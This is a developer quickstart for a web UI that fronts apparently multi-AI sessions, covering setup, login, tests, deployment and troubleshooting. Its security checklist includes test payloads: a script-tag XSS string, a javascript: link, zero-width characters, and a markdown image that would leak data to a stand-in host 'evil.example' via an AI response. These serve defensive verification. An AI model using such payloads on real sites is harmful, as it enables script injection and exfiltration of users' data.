# Quickstart: Phase 2 Web UI

**Branch**: `011-web-ui` | **Date**: 2026-04-20

How to run, develop, and manually verify the Web UI.

---

## Prerequisites

- Phase 1 stack running: `docker compose up -d` exposes port 8750 and Postgres.
- A facilitator bearer token from a created session (`POST /tools/session/create` on the MCP app).

## Running the Web UI

**Dev mode** (alongside existing MCP server):

```bash
uvicorn src.web_ui.app:create_web_app --host 0.0.0.0 --port 8751 --factory --reload
```

**Docker mode**: the entrypoint in `Dockerfile` launches both apps; no extra command
needed once the image is rebuilt.

Open `http://localhost:8751/` in a browser.

---

## First-run flow

1. Land on `/` → AuthGate screen.
2. Paste your bearer token → `POST /login` → cookie set.
3. Redirected to `/session/<session_id>` → `SessionView` renders from the WebSocket `state_snapshot` within 2s.
4. Type a message → Ctrl+Enter → `POST /tools/participant/inject_message` → the message appears in the transcript when the next `message` event arrives (your own injection is reflected immediately as a human message, AI responses arrive as they complete).

---

## Manual verification checklist

Run through these after every UI merge. Automated tests in `tests/e2e/`
cover the happy paths; the checklist below catches the fuzzy stuff.

### Security (SR-001 → SR-008)

- [ ] Paste `<script>alert(1)</script>` into a message; confirm no alert fires, content renders as plain text.
- [ ] Render an AI response containing `![x](https://evil.example/pixel?d=secret)`; confirm image replaced with `[Image: x]` inline text.
- [ ] Click a link with `javascript:alert(1)`; confirm click blocked, warning badge shows.
- [ ] Inject a message with zero-width spaces; confirm `[ZWS]` marker renders with count badge.
- [ ] DevTools → Application → Storage; confirm no bearer token in `localStorage` / `sessionStorage` / IndexedDB.
- [ ] Response headers: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` all present.
- [ ] CORS: `curl -H 'Origin: https://evil.example' http://localhost:8751/tools/...` rejected.

### WebSocket (FR-004, FR-014, SC-002, SC-003)

- [ ] Open UI → trigger `docker compose restart sacp` → confirm UI shows "reconnecting", then resyncs from snapshot.
- [ ] Start loop → two AI turns complete → confirm transcript updates within 2s of each `message` event in browser DevTools Network/WS.
- [ ] Revoke your token via `POST /tools/facilitator/revoke_token` → confirm WS closes with 4401 and UI shows login prompt.

### Role gating (FR-009)

- [ ] Login as non-facilitator participant → confirm "Add participant", "Create invite", "Pause loop", and pause-scope toggle are hidden.
- [ ] Login as facilitator → confirm those controls are visible and functional.

### Dashboard panels (Phase 2b)

- [ ] Set a participant's `budget_daily`; run 10+ turns; confirm budget bar advances and color escalates as it approaches 100%.
- [ ] Confirm convergence sparkline updates on each `convergence_update` event.
- [ ] Confirm summary panel shows the latest checkpoint with non-empty `decisions` / `open_questions` / `key_positions` arrays after 10+ turn session.

### Review gate (Phase 2c)

- [ ] Set a participant to `review_gate` routing → next turn → draft appears in the queue within 2s.
- [ ] Approve → draft moves to transcript as that participant's turn.
- [ ] Edit → drafted content changes, then approved version appears in transcript.
- [ ] Reject → draft disappears from queue, no new transcript entry.

---

## Running tests

```bash
# Backend
pytest tests/test_web_ui_app.py tests/test_web_ui_websocket.py -v

# End-to-end (requires server running on 8750 + 8751, and Playwright installed)
pytest tests/e2e/ -v
```

## Deploying

1. Merge to `main`.
2. Docker image rebuilds automatically via GHCR workflow.
3. Deploy without wipe: `sudo bash -c "docker compose down && docker compose pull && docker compose up -d"`.
4. Navigate to `http://<host>:8751/`.

---

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| UI loads blank white page | CSP blocked CDN | Check browser console; update SRI hash in `index.html` |
| `401` on `/login` | Bearer token expired | Generate a fresh token via MCP API |
| WebSocket closes with 4403 immediately | Participant no longer in session | Re-join via invite link |
| `state_snapshot` never arrives | WS upgrade failed silently | Check uvicorn logs for origin header rejection |
| Messages double-render | Local optimistic update + WS echo collide | Check component dedupe logic in `Transcript.jsx` |
